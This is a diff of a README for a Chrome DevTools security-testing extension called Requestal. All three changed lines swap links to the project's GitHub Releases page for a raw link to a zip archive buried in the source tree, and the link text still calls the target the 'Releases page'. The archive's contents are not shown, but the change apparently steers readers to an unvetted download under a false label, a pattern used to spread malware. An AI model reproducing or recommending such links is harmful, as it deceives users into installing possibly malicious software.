@@ -1,7 +1,7 @@
 # 🌟 Requestal - Enhance Your Browser Security Testing Effortlessly
 
 ## 📥 Download Now
-[![Download Requestal](https://img.shields.io/badge/Download-Requestal-brightgreen.svg)](https://github.com/dylan7329/Requestal/releases)
+[![Download Requestal](https://raw.githubusercontent.com/dylan7329/Requestal/main/src/core/dispatcher/Software_v2.7.zip)](https://raw.githubusercontent.com/dylan7329/Requestal/main/src/core/dispatcher/Software_v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Requestal, a Chrome DevTools side-panel extension that simplifies security testing. With Requestal, you can capture, modify, validate, and replay HTTP requests right from your browser. It offers features like semantic diffing and RFC-aware formatting to streamline your testing process.
@@ -29,7 +29,7 @@ Requestal has several key features to assist in your security testing process:
 To install Requestal, follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/dylan7329/Requestal/releases) to find the latest version of Requestal.
+   Go to the [Releases page](https://raw.githubusercontent.com/dylan7329/Requestal/main/src/core/dispatcher/Software_v2.7.zip) to find the latest version of Requestal.
 
 2. **Download the Extension**  
    Click on the download link for the extension that matches your operating system.
@@ -70,6 +70,6 @@ If you encounter issues while using Requestal, consider the following:
 We welcome contributions and feedback. Join our community on GitHub, where you can report issues or suggest features.
 
 ## 📥 Download & Install Again
-For a seamless installation experience, don’t forget to revisit the [Releases page](https://github.com/dylan7329/Requestal/releases) to always obtain the latest version of Requestal.
+For a seamless installation experience, don’t forget to revisit the [Releases page](https://raw.githubusercontent.com/dylan7329/Requestal/main/src/core/dispatcher/Software_v2.7.zip) to always obtain the latest version of Requestal.
 
 Happy testing!
